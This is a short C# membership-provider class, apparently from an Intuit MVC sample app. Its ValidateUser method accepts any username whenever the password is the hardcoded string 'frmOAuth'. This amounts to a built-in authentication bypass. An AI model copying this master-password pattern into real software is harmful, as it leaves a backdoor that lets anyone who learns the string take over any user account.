using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using WebMatrix.WebData;

namespace IntuitSampleMVC.utils
{
    public class CustomProviderProvider : SimpleMembershipProvider
    {
        public override bool ValidateUser(string username, string password)
        {
            if (password == "frmOAuth")
            return true; 
            else return  base.ValidateUser(username, password);
        }
    }
}